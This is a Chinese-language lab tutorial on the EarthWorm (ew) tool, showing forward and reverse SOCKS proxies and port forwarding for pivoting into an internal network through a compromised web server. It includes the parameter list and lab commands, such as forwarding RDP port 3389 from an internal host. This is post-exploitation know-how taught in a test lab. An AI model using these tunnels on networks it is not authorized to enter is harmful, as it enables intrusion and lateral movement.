## ****原理****

 ** **1、ew反向代理（内网机器无公网ip需要反弹到公网，需要在vps监听）****

 ** **vps服务端执行：****

 ** **./ew_for_linux64 -s rcsocks -l 1080 -e 1024****

 ** **内网机器执行：****

 ** **ew_for_Win.exe -s rssocks -d vps的ip -e 1024****

 ** **使用方式：sock5代理访问的1080端口****

 ** ******

 ** **2、正向代理（跳ban机既有内网ip又有公网ip，直接建立正向代理进入内网，无需vps）****

 ** **内网机器执行：****

 ** **ew_for_Win.exe -s ssocksd -l 1080****

 ** **使用方式：sock5代理访问内网机器的外网ip的1080端口****

##  ** **思维导图****

![1615380374_6048bf969572131b859b0.png!small?1615380373444](https://image.3001.net/images/20210310/1615380374_6048bf969572131b859b0.png!small?1615380373444)

## 参数详解

 ** **VERSION : free1.2 （版本号1.2）****

 ** **./xxx ([-options] [values])*****

 ** **options :****

 ** **Eg: ./xxx -s ssocksd -h****

 ** **-s state setup the function.You can pick one from the ##指定使用的代理方式****

 ** **following options:****

 ** **ssocksd ：##正向代理****

 ** **rcsocks ##反向代理****

 ** **rssocks ##****

 ** **lcx_listen ##监听****

 ** **lcx_tran ##反向连接 一步就成****

 ** **lcx_slave ##正向连接（配合listen使用）****

 ** **-l listenport open a port for the service startup. ## 监听得端口****

 ** **-d refhost set the reflection host address. ## 设置反射主机地址****

 ** **-e refport set the reflection port. ## 设置反射端口****

 ** **-f connhost set the connect host address . ## 设置连接主机地址****

 ** **-g connport set the connect port. ## 设置连接端口****

 ** **-h help show the help text, By adding the -s parameter, ## 帮助****

 ** **you can also see the more detailed help. ##****

 ** **-a about show the about pages ## 关于显示关于页面****

 ** **-v version show the version. ## 版本****

 ** **-t usectime set the milliseconds for timeout. The default ##设置超时的毫秒数****

 ** **value is 1000 ##****

##  ** **一、流量映射****

 ** **1.环境准备****

 ** **一台kali 客户端，可以联通内网，也可以连通外网****

 ** **外网ip 192.168.0.103****

 ** **内网ip 192.168.52.2****

 ** **一台win server03 内网web服务器****

 ** **内网ip 192.168.52.3****

 ** **一台win10外网客户机****

 ** **同样的需要将ew这款工具进行拉入到靶机里面****

 ** **如下图：****

![1615380417_6048bfc168e55717e54b2.png!small?1615380416109](https://image.3001.net/images/20210310/1615380417_6048bfc168e55717e54b2.png!small?1615380416109)

![1615380421_6048bfc5318d5aa8c1d5d.png!small?1615380419983](https://image.3001.net/images/20210310/1615380421_6048bfc5318d5aa8c1d5d.png!small?1615380419983)

 ** **2.流量映射****

###  ** **A、正向代理****

 ** **在kali中直接去连接****

 ** **./ew -s ssocksd -l 8888 开启 8888 端口的 socks 代理****

 ** **攻击机通过访问 目标主机8888 端口使用目标主机提供的代理****

 ** **./ew**** ** **-s ssocksd -l 8888****

![1615380436_6048bfd4b13e8ecad1d3f.png!small?1615380435371](https://image.3001.net/images/20210310/1615380436_6048bfd4b13e8ecad1d3f.png!small?1615380435371)

 ** **在火狐中设置代理****

![1615380445_6048bfdd383ec290438dd.png!small?1615380443935](https://image.3001.net/images/20210310/1615380445_6048bfdd383ec290438dd.png!small?1615380443935)

 ** **然后再访问百度****

 ** **发现反射回去了****

![1615380458_6048bfea3b481e0e5b104.png!small?1615380456965](https://image.3001.net/images/20210310/1615380458_6048bfea3b481e0e5b104.png!small?1615380456965)

 ** **访问内网发现成功****

![1615380466_6048bff238e20c8d96bb8.png!small?1615380465009](https://image.3001.net/images/20210310/1615380466_6048bff238e20c8d96bb8.png!small?1615380465009)

![1615380470_6048bff60f8c257d50139.png!small?1615380468819](https://image.3001.net/images/20210310/1615380470_6048bff60f8c257d50139.png!small?1615380468819)

###  ** **B、反向代理****

 ** **第一种情况：拿下了web服务器，和内网服务器****

 ** ******

 ** **这次要准备kali作为web服务器，连接外网的****

 ** **win server 03作为内网服务器****

 ** **1.在公网服务器(kali)上执行以下命令进行监听:****

 ** **./ew -s rcsocks -l 1080 -e 1024 监听本机的1080端口转发到反连1024端口的主机****

 ** **./ew -s rcsocks -l 7777 -e 1024****

![1615380478_6048bffebd8aafaf25538.png!small?1615380477528](https://image.3001.net/images/20210310/1615380478_6048bffebd8aafaf25538.png!small?1615380477528)

 ** **2.在win server 03中进行流量映射****

 ** **.\ew_for_Win.exe -s rssocks -d 97.xx.xx.23 -e 1024
通过socks隧道连接公网IP的1024端口****

 ** **ew -s rssocks -d 192.168.52.2 -e 1024****

![1615380489_6048c009def9500235327.png!small?1615380488652](https://image.3001.net/images/20210310/1615380489_6048c009def9500235327.png!small?1615380488652)

 ** **3.设置火狐代理****

 ** **代理类型一定要是SOCKS5****

![1615380499_6048c0138a967ed6ac42c.png!small?1615380498486](https://image.3001.net/images/20210310/1615380499_6048c0138a967ed6ac42c.png!small?1615380498486)

 ** **访问一下百度，发现是这样****

![1615380509_6048c01d3232c4b1f5b2c.png!small?1615380507901](https://image.3001.net/images/20210310/1615380509_6048c01d3232c4b1f5b2c.png!small?1615380507901)

 ** **然后我们在进行访问一下win server 03内网服务器****

![1615380519_6048c0275d332df09528b.png!small?1615380518058](https://image.3001.net/images/20210310/1615380519_6048c0275d332df09528b.png!small?1615380518058)

 ** **发现同样能成功****

看一下隧道的变化

![1615380527_6048c02f5f2e59d3a23cf.png!small?1615380526173](https://image.3001.net/images/20210310/1615380527_6048c02f5f2e59d3a23cf.png!small?1615380526173)

![1615380531_6048c0330394f72d88f6c.png!small?1615380529750](https://image.3001.net/images/20210310/1615380531_6048c0330394f72d88f6c.png!small?1615380529750)

 ** **至此我们就可以漫游内网了****

 ** ******

##  ** **第二种情况：****

 ** **只拿下了一台web服务器****

直接手画草图，哈哈，够敬业吧

![1615380553_6048c049150be9fc83501.png!small?1615380568614](https://image.3001.net/images/20210310/1615380553_6048c049150be9fc83501.png!small?1615380568614)

 ** **实验环境****

 ** **kali ：web服务器：****

 ** **192.168.0.105****

 ** **192.168.52.6****

 ** **win server 03 ：内网服务器****

 ** **192.168.52.11****

 ** **win 10 模拟公网vps主机1：****

 ** **192.168.0.104****

 ** **win 7 模拟攻击机2设置代理访问内网****

 ** **192.168.0.102****

  

 ** **1.首先在win10（vps）上进行监听****

 ** **ew -s rcsocks -l 7777 -e 1024****

![1615380592_6048c070dc442189dbc36.png!small?1615380591710](https://image.3001.net/images/20210310/1615380592_6048c070dc442189dbc36.png!small?1615380591710)

 ** **2.再在kali上设置反向代理****

 ** **./ew -s rssocks -d vps公网ip -e 1024****

 ** **./ew -s rssocks -d 192.168.0.104 -e 1024****

![1615380603_6048c07bd218fd81e92cb.png!small?1615380602597](https://image.3001.net/images/20210310/1615380603_6048c07bd218fd81e92cb.png!small?1615380602597)

 ** **3.从win7中进行设置代理****

![1615380614_6048c086084143bbad30d.png!small?1615380613083](https://image.3001.net/images/20210310/1615380614_6048c086084143bbad30d.png!small?1615380613083)

![1615380621_6048c08d4a5878a1b64e5.png!small?1615380620056](https://image.3001.net/images/20210310/1615380621_6048c08d4a5878a1b64e5.png!small?1615380620056)

 ** **发现可以直接漫游内网****

 ** **4.咱们访问的时候观察一下反向代理的变化****

![1615380632_6048c098938822a00b1f6.png!small?1615380631272](https://image.3001.net/images/20210310/1615380632_6048c098938822a00b1f6.png!small?1615380631272)

 ** **发现成功到达内网的80****

 ** **至此我们就可以漫游内网了****

 ** ******

 ** ******

##  ** **二、端口转发****

思维导图在上个lck的差不多，所以我就在网上随便扒下来一张，博主觉得侵权的话，来找我，我给你一个oday，啊哈哈哈~~~

![1615380641_6048c0a18e2bc1ab53442.png!small?1615380640303](https://image.3001.net/images/20210310/1615380641_6048c0a18e2bc1ab53442.png!small?1615380640303)

###  ** **A、反向代理****

 ** **./ew -s lcx_tran -l kali上监听端口 -f 指定得内网地址 -g 内网某服务端口****

 ** **./ew -s lcx_tran -l 4444 -f 192.168.52.3 -g 3389****

 ** **可以一步到位，直接连接****

![1615380653_6048c0ad92c128d9c2403.png!small?1615380653277](https://image.3001.net/images/20210310/1615380653_6048c0ad92c128d9c2403.png!small?1615380653277)

###  ** **B、正向代理****

 ** **a、**** ** **先**** ** **创建监听****

 ** **./ew -s lcx_listen -l 监听的公网端口 -e web服务器得内网端口****

 ** **./ew -s lcx_listen -l 9083 -e 9091****

![1615380728_6048c0f82e159d0fbe50b.png!small?1615380726915](https://image.3001.net/images/20210310/1615380728_6048c0f82e159d0fbe50b.png!small?1615380726915)

 ** **b、**** ** **后**** ** **在win server 中进行转发****

 ** **ew -s lcx_slave -d web服务器得内网地址 -e web服务器得内网端口 -f 内网地址 -g 内网得服务端口****

 ** **ew -s lcx_slave -d 192.168.52.2 -e 9091 -f 192.168.52.3 -g 3389****

 ** **纠正：（以后实战的时候进行纠正）****

 ** **应该是在web服务器上面执行的：****

 ** **ew -s lcx_slave -d web服务器得内网地址 -e web服务器得内网端口 -f 内网地址 -g 内网得服务端口****

![1615380740_6048c104a3bbd8286be81.png!small?1615380739348](https://image.3001.net/images/20210310/1615380740_6048c104a3bbd8286be81.png!small?1615380739348)

 ** **验证****

![1615380749_6048c10dca67170867284.png!small?1615380749487](https://image.3001.net/images/20210310/1615380749_6048c10dca67170867284.png!small?1615380749487)

 ** **验证成功****

  

